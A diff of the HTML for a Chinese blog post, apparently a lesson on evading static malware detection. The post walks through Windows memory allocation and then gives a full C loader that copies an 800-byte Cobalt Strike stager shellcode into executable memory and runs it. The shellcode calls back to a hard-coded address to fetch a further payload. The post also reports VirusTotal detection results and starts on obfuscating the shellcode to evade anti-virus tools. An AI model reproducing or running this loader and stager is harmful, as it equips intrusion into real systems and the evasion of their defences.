@@ -1,51 +1,70 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>静态恶意代码逃逸（第二课） - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>10</span>
-<span class=rest>Nov 2019</span></div></div><div class=matter><h1 class=title>静态恶意代码逃逸（第二课）</h1></div></div><h2 id=0x01-关于windows操作系统内存>0x01 关于Windows操作系统内存</h2><p>前五课的代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><p>这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>…</li></ul><h2 id=0x02-申请内存api的关系>0x02 申请内存API的关系</h2><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p><h2 id=0x03-实现一次正常加载>0x03 实现一次正常加载</h2><p>这里我创建了一个C++项目，名字为：BadCode</p><p>先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第二课） - 倾旋的博客</title><meta name=theme-color><meta name=description content='0x01 关于Windows操作系统内存
+前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。
+操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。
+在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。
+申请方式：
+
+HeapAlloc
+malloc
+VirtualAlloc
+new
+LocalAlloc
+…
+
+0x02 申请内存API的关系
+其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。
+0x03 实现一次正常加载
+这里我创建了一个C++项目，名字为：BadCode
+先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。
+#include <Windows.h>
+
+
+// 入口函数
+int wmain(int argc,TCHAR * argv[]){
+
+    int shellcode_size = 0; // shellcode长度
+    DWORD dwThreadId; // 线程ID
+    HANDLE hThread; // 线程句柄
+/* length: 800 bytes */
+
+unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x45\x4f\x78\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x4e\x4c\x4e\x4c\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x30\x2e\x31\x32\x38\x00\x00\x00\x00\x00";
+
+// 获取shellcode大小
+shellcode_size = sizeof(buf);
+
+/*
+VirtualAlloc(
+    NULL, // 基址
+    800,  // 大小
+    MEM_COMMIT, // 内存页状态
+    PAGE_EXECUTE_READWRITE // 可读可写可执行
+    );
+*/
+
+char * shellcode = (char *)VirtualAlloc(
+    NULL,
+    shellcode_size,
+    MEM_COMMIT,
+    PAGE_EXECUTE_READWRITE
+    );
+    // 将shellcode复制到可执行的内存页中
+CopyMemory(shellcode,buf,shellcode_size);
+
+hThread = CreateThread(
+    NULL, // 安全描述符
+    NULL, // 栈的大小
+    (LPTHREAD_START_ROUTINE)shellcode, // 函数
+    NULL, // 参数
+    NULL, // 线程标志
+    &amp;dwThreadId // 线程ID
+    );
+
+WaitForSingleObject(hThread,INFINITE); // 一直等待线程执行结束
+    return 0;
+}
+编译成功后，运行：'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="静态恶意代码逃逸（第二课）"><meta itemprop=description content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><meta itemprop=datePublished content="2019-11-10T00:00:00+00:00"><meta itemprop=dateModified content="2019-11-10T00:00:00+00:00"><meta itemprop=wordCount content="236"><meta property="og:url" content="https://payloads.online/archivers/2019-11-10/2/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="静态恶意代码逃逸（第二课）"><meta property="og:description" content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-11-10T00:00:00+00:00"><meta property="article:modified_time" content="2019-11-10T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="静态恶意代码逃逸（第二课）"><meta name=twitter:description content="来来回回就会这么一点东西，不想一直停留在一个点上了，准备总结一下，往深的走。"><link rel=canonical href=https://payloads.online/archivers/2019-11-10/2/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">静态恶意代码逃逸（第二课）</h1><div class="text-xs antialiased opacity-60"><time>Nov 10, 2019</time><span class=mx-1>&#183;</span>
+<span>倾旋</span></div></header><section><h2 id=0x01-关于windows操作系统内存>0x01 关于Windows操作系统内存</h2><p>前五课的代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><p>这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>…</li></ul><h2 id=0x02-申请内存api的关系>0x02 申请内存API的关系</h2><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p><h2 id=0x03-实现一次正常加载>0x03 实现一次正常加载</h2><p>这里我创建了一个C++项目，名字为：BadCode</p><p>先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#75715e>// 入口函数
@@ -91,58 +110,7 @@
 </span></span><span style=display:flex><span><span style=color:#a6e22e>WaitForSingleObject</span>(hThread,INFINITE); <span style=color:#75715e>// 一直等待线程执行结束
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>编译成功后，运行：</p><p><img src=https://images.payloads.online/787a6f56-4f5f-11ec-9d50-00d861bf4abb.png alt=2019-11-10-02-02-56></p><p>V站查杀结果：</p><p><img src=https://images.payloads.online/78b7773e-4f5f-11ec-8904-00d861bf4abb.png alt=2019-11-10-02-03-07></p><p><a href=https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection>https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection</a></p><p>这个效果已经很好，但是我想要更好。</p><h2 id=0x04-实现一次混淆加载>0x04 实现一次混淆加载</h2><p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
